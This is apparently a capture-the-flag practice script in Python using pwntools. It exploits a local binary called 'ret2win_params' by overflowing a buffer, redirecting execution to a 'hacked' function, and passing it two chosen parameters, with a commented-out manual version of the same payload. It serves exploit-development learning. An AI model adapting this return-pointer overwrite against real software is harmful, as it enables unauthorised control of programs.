#!/usr/bin/env python3

from pwn import *

exe = 'ret2win_params'

elf = context.binary = ELF(exe,checksec=False)

context.log_level = 'debug'

io = process(exe)

padding = 28

hacked = 0x08049186
param1 = 0xdeadbeef
param2 = 0xc0debabe


payload = flat(
	asm('nop') * padding,
	elf.symbols.hacked,  ## calling hacked function
	elf.functions.main,  ## return pointer for hacked function, I put return address of main so after completing the execution of hacked we will return to main which in turn will again call the function register_name and we will be prompted for another input
	param1,
	param2,
)

io.sendlineafter(b':',payload)

io.interactive()





#from pwn import *

#io = process('./ret2win_params')

#context.log_level = 'debug'

#io.sendlineafter(b':\n',b'A'*28 + p32(0x08049186 ) + b'A' * 4 + p32(0xdeadbeef) + p32(0xc0debabe) )

#print(io.recvall().decode('latin-1'))

#io.interactive()

